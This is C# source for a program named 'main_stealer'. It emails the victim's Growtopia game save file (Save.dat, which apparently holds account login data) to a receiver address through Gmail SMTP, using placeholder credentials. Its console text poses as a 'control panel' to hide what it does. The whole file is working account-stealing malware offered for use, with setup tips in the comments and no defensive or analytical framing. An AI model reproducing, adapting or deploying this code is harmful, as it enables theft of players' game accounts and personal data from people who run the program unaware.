using System;
using System.Net.Mail;
using System.Net;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.IO;
using System.Text.RegularExpressions;
using System.Collections;

namespace main_stealer
{
    class Program
    {
        static void Main(string[] args)
        {
            SmtpClient sc = new SmtpClient();
            sc.Port = 587;
            sc.Host = "smtp.gmail.com";
            sc.EnableSsl = true;

            sc.Credentials = new NetworkCredential("SENDERMAIL@gmail.com", "PASSWORD"); // sender of the mail , password of the mail
                                                                                        // i suggest you to open a new mail for this

            MailMessage mail = new MailMessage();

            mail.From = new MailAddress("SENDERMAIL@gmail.com", "NAME"); // sender of the mail , name of the sender

            mail.To.Add("RECEIVERMAIL@gmail.com"); // receiver of the mail

            mail.Subject = ""; // subject of the mail 
            /*DateTime date1 = DateTime.Now;      // date + time of time moment
            string date1_str = date1.ToString();  // transforming into string
            mail.Subject = date1_str; */          // making subject of the mail date + time
                                                  // if u want to open this, erase /* and */
            mail.IsBodyHtml = true;
            mail.Body = ""; // content of the mail

            mail.Attachments.Add(new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Growtopia\Save.dat"));

            sc.Send(mail);
            Console.Write("Press any key to close control panel.\n\n");
            Console.ReadKey();
        }
    }
}
